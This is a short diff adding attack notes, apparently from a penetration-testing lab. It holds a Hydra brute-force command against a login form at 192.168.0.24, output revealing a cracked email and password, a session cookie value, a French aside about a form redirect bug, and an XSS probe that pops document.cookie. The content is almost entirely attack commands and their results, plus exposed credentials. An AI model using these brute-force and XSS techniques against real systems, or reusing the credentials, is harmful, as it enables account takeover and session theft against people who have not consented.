@@ -1,0 +1,13 @@
+hydra -s 80 -l marc.martin@gmail.com -P ../marc.txt http-post-form://192.168.0.24"/checkCredentials.php:username=^USER^&password=^PASS^:login failed"
+
+[80][http-post-form] host: 192.168.0.24   login: marc.martin@gmail.com   password: Martin06980
+
+
+
+
+
+
+(il y a une erreur dans votre form je crois il redirige sur /session1.php alors qu'il devrait rediriger sur => session.php)
+PHPSESSID=c3c1e5tun1dd3s3s51on
+
+<img src="ded" onerror="alert(document.cookie);">
